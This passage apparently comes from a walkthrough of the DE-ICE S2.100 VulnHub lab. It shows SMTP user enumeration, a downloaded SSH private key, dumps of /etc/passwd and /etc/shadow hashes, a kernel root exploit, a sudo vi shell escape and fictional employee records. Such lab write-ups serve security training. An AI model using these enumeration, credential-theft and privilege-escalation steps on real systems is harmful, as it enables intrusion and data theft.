-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:# for i in $(cat ~/vulnhub/DE-ICE-S2.100/userlist.txt); do echo $i; echo -e "\nehlo lol\nmail from:$i@slax.example.net\nrcpt to:$i\nquit\n" | nc 192.168.2.100 25; done  | grep -i 'Recipient ok'
-</span><span class='line'>250 2.1.5 havisham... Recipient ok
-</span><span class='line'>250 2.1.5 magwitch... Recipient ok
-</span><span class='line'>250 2.1.5 pirrip... Recipient ok</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Again, this could be automatized using smtp-user-enum script:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:# smtp-user-enum -M RCPT -f root@slax.example.net -U userlist.txt -t 192.168.2.100</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Dirb found the following URLs:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.2.101/~havisham/
-</span><span class='line'>http://192.168.2.101/~magwich/
-</span><span class='line'>http://192.168.2.101/~pirrip/
-</span><span class='line'>http://192.168.2.101/~pirrip/.ssh/</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We download the private key of pirrip user and log in:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN RSA PRIVATE KEY-----
-</span><span class='line'>MIIEoQIBAAKCAQEA1pfb/CVukUw4Xe67YLEZzVHWNax0zJjI1CfcsoEGylmmtlA6
-</span><span class='line'>iXHi41nLshzXu9n536JfM9LFAWGqefBVX7Bzd/fC4+jHS3q89IK9FP7gFPwEmlNH
-</span><span class='line'>CwPX0ADxDFyB1lJOFffJ9gVw3VgHCaCPgS70UqJD0hZFDMSDMoBa91PylFQR0m58
-</span><span class='line'>nMq8DsGRbeC5hTdpLXKfBuW8v/lFuNEWVWNcZDie82aiJg8WRUUIrzeGZSR3+cG1
-</span><span class='line'>hi6za67VIi+ce8fFuBvIgaEpvJ0JSIX7zPLUV10ezW1NQRNplKSam3TIYI3+Ywuh
-</span><span class='line'>lcgpEyliHYReN6v91+um2c6LNy9y/vx2Akci5QIBIwKCAQEAvhF5s3GcchBPLqA/
-</span><span class='line'>kCfVBk/MW2zcerM1iLWXlsoNVCOFB+Co4CMKyV4pcd8IOKsfJSlqQ9fwUa5GiUKU
-</span><span class='line'>wne2urbf0S1CzdMcY4m9al4W7gPJkACeAnEeO+OTq9zoBvhxDCSc79ju7+7hqXD0
-</span><span class='line'>IfZjXyIBjjD7VHOKJWpfMtVTMunBCMqoAMa2veuN6LgDJweQNi7kon4qcj4SghGI
-</span><span class='line'>bdBv/Cnk7PMkG+DhafTRWyXGMWFpTHV4BNKv0i+k4lVV1oP9nJnh9jglY4EkD9LD
-</span><span class='line'>0Yt2QZt+XMTlxScsjcBpVGc9m4ZrgmRZGV0PTyMuWJtURkDBYPizkiPjjSZfUbyZ
-</span><span class='line'>y9QECwKBgQDsR9wLzrQbJIaOX8dG4rEt8pQHdYK7KCM8Bcq45iKKPzeLxchguM3o
-</span><span class='line'>+y9nRz5x8RWXWZUMl7PldoqwmrKh6WVCrdJ7mghPTYx3Djhcaf8q5XFTUhZH4xhB
-</span><span class='line'>72g1H6+JCECUjAFfjoSTOEswCFKYssgYA22x3fvLGg3S8f0UjjE1xQKBgQDogKVg
-</span><span class='line'>iyXCE833evccfrd/otsyVcxNincunAtYDAsqa2ZrjXL3oFwNwfC1CVKPhqDlnG46
-</span><span class='line'>M1tiSeYXygPbuPbHzRdu0ZuG7jRxxVdndl52gq/Zt8MKNRD9mdbFRcRMXmMRfaE4
-</span><span class='line'>RXdry9eB4rPywfWgJPGNVtOFZP6PRVv+IpoqoQKBgBRArHYKZzWGybRunA1j400U
-</span><span class='line'>ytwRYvoZYhsWcHY/nI+Bwu65Lm6wwTE6GgGJw4Yb+olQ0kLoboFh7qFsWHRHNJCv
-</span><span class='line'>0DZ66sT4BLm/Y+qp/+275SRmHyq7sZ9AaASNr/XNgeDYzOru9Wu0XjdRK6awPQlf
-</span><span class='line'>YSyAvc+UhNeRFbFOBDfPAoGAVlurI9vpc/i6N1mO+/SNTKo0KKOGZfGZ+16H3t/m
-</span><span class='line'>496/pEp7KMaIl2VKxuY0m7WpedsEXsKeSRQiQ1mpqWH1QuXG4AS2HCyXIvGG3Uk5
-</span><span class='line'>B3JekrH3/HocQO//UJZBmLVX/y6pmI7UlcC9wodnaMuzAPfHbwL+G5qKb7qtI+D3
-</span><span class='line'>busCgYATj4y+8msxNWRRNbHWAV7G0OurPDeZJ8F8NDLpM22X8fM08wgGRwkW4fpa
-</span><span class='line'>A+J8tN2ibiDqw29W6Rc1/4evAPbo3GR932W/ELOTOpP2yquiwoSxPG+HCLHmDITr
-</span><span class='line'>1qGHJRSOiFzo99iS5aQRhUvdl3M0lz1Cort7hjRKUkSWcT02Rw==
-</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# chmod 600 pirrip-rsa.ssh
-</span><span class='line'>root@kali:~# ssh -l pirrip 192.168.2.100 -i pirrip-rsa.ssh
-</span><span class='line'>Linux 2.6.16.
-</span><span class='line'>pirrip@slax:~$
-</span><span class='line'>
-</span><span class='line'>pirrip@slax:/etc$ cat /etc/passwd
-</span><span class='line'>root:x:0:0::/root:/bin/bash
-</span><span class='line'>bin:x:1:1:bin:/bin:
-</span><span class='line'>daemon:x:2:2:daemon:/sbin:
-</span><span class='line'>adm:x:3:4:adm:/var/log:
-</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:
-</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
-</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
-</span><span class='line'>mail:x:8:12:mail:/:
-</span><span class='line'>news:x:9:13:news:/usr/lib/news:
-</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucppublic:
-</span><span class='line'>operator:x:11:0:operator:/root:/bin/bash
-</span><span class='line'>games:x:12:100:games:/usr/games:
-</span><span class='line'>ftp:x:14:50::/home/ftp:
-</span><span class='line'>smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
-</span><span class='line'>mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
-</span><span class='line'>rpc:x:32:32:RPC portmap user:/:/bin/false
-</span><span class='line'>sshd:x:33:33:sshd:/:
-</span><span class='line'>gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
-</span><span class='line'>pop:x:90:90:POP:/:
-</span><span class='line'>nobody:x:99:99:nobody:/:
-</span><span class='line'>pirrip:x:1000:10:Philip Pirrip:/home/pirrip:/bin/bash
-</span><span class='line'>magwitch:x:1001:100:Abel Magwitch:/home/magwitch:/bin/bash
-</span><span class='line'>havisham:x:1002:100:Estella Havisham:/home/havisham:/bin/bash</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The root accound can be obtained using exploit from Kali:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/exploitdb# 
-</span><span class='line'>
-</span><span class='line'>  * hoagie_udp_sendmsg.c
-</span><span class='line'>  * LOCAL LINUX KERNEL ROOT EXPLOIT (&lt; 2.6.19) - CVE-2009-2698</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.1# cat /etc/shadow
-</span><span class='line'>root:$1$/Ta1Q0lT$CSY9sjWR33Re2h5ohV4MX/:13882:0:::::
-</span><span class='line'>bin:*:9797:0:::::
-</span><span class='line'>daemon:*:9797:0:::::
-</span><span class='line'>adm:*:9797:0:::::
-</span><span class='line'>lp:*:9797:0:::::
-</span><span class='line'>sync:*:9797:0:::::
-</span><span class='line'>shutdown:*:9797:0:::::
-</span><span class='line'>halt:*:9797:0:::::
-</span><span class='line'>mail:*:9797:0:::::
-</span><span class='line'>news:*:9797:0:::::
-</span><span class='line'>uucp:*:9797:0:::::
-</span><span class='line'>operator:*:9797:0:::::
-</span><span class='line'>games:*:9797:0:::::
-</span><span class='line'>ftp:*:9797:0:::::
-</span><span class='line'>smmsp:*:9797:0:::::
-</span><span class='line'>mysql:*:9797:0:::::
-</span><span class='line'>rpc:*:9797:0:::::
-</span><span class='line'>sshd:*:9797:0:::::
-</span><span class='line'>gdm:*:9797:0:::::
-</span><span class='line'>pop:*:9797:0:::::
-</span><span class='line'>nobody:*:9797:0:::::
-</span><span class='line'>pirrip:$1$KEj04HbT$ZTn.iEtQHcLQc6MjrG/Ig/:13882:0:99999:7:::
-</span><span class='line'>magwitch:$1$qG7/dIbT$HtTD946DE3ITkbrCINQvJ0:13882:0:99999:7:::
-</span><span class='line'>havisham:$1$qbY1hmdT$sVZn89wKvmLn0wP2JnZay1:13882:0:99999:7:::
-</span><span class='line'>
-</span><span class='line'>sh-3.1# cat /var/access/.htpasswd
-</span><span class='line'>aadams:bS.PQ9hVYEqrQ</span></code></pre></td></tr></table></div></figure>
-
-
-<p>There is another way to get root account. At first we find out the password for
-pirrip user:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>pirrip@slax:/var/spool/mail$ cat pirrip
-</span><span class='line'>
-</span><span class='line'>E-Mail: pirrip@slax.example.net
-</span><span class='line'>Password: 0l1v3rTw1st</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>pirrip@slax:/var/spool/mail$ sudo -l
-</span><span class='line'>pirrip@slax:/var/spool/mail$ sudo vi
-</span><span class='line'>:!/bin/bash</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Finally, in /root/.save we obtain the following data:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>From sikes@slax.example.net  Sun Jan 13 23:53:37 2008
-</span><span class='line'>Return-Path: &lt;sikes@slax.example.net>
-</span><span class='line'>Received: from slax.example.net (localhost [127.0.0.1])
-</span><span class='line'>        by slax.example.net (8.13.7/8.13.7) with ESMTP id m0DNlmHb009636
-</span><span class='line'>        for &lt;pirrip@slax.example.net>; Sun, 13 Jan 2008 23:47:48 GMT
-</span><span class='line'>Received: (from sikes@slax.example.net)
-</span><span class='line'>        by slax.example.net (8.13.7/8.13.7/Submit) id m0DNlmDI009635
-</span><span class='line'>        for pirrip; Sun, 13 Jan 2008 23:47:48 GMT
-</span><span class='line'>From: Bill Sikes &lt;sikes@slax.example.net>
-</span><span class='line'>Message-Id: &lt;200801132347.m0DNlmDI009635@slax.example.net>
-</span><span class='line'>Date: Sun, 13 Jan 2008 23:47:48 +0000
-</span><span class='line'>To: pirrip@slax.example.net
-</span><span class='line'>Subject: Raises
-</span><span class='line'>User-Agent: nail 11.25 7/29/05
-</span><span class='line'>MIME-Version: 1.0
-</span><span class='line'>Content-Type: text/plain; charset=us-ascii
-</span><span class='line'>Content-Transfer-Encoding: 7bit
-</span><span class='line'>
-</span><span class='line'>Here's the data for raises for your team:
-</span><span class='line'>Philip Pirrip:  734-67-0424 5.5% $74,224
-</span><span class='line'>Abel Magwitch:  816-03-0028 4.0% $53,122
-</span><span class='line'>Estella Havisham: 762-93-1073 12% $84,325</span></code></pre></td></tr></table></div></figure>
 
 </div>
   
